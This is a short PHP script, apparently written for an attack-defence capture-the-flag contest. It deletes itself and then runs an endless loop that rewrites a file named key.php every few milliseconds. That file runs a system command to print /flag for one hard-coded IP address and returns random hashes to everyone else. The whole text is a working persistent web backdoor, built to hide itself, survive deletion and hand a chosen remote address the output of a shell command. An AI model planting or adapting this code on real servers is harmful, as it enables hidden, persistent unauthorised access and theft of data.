<?php 
	//By ZacharyZcR
	ignore_user_abort(true);
	set_time_limit(0);
	unlink(__FILE__);
	$file = 'key.php';
	$code = '<?php 
	$ip = $_SERVER["REMOTE_ADDR"];
	if($ip=="117.173.217.106"){
		echo("Administrator Confirmation.\r\n");
		system("cat /flag");
	}
	else echo(md5(mt_rand()));?>';
	while (1){
		file_put_contents($file,$code);
		usleep(5000);
}
?>
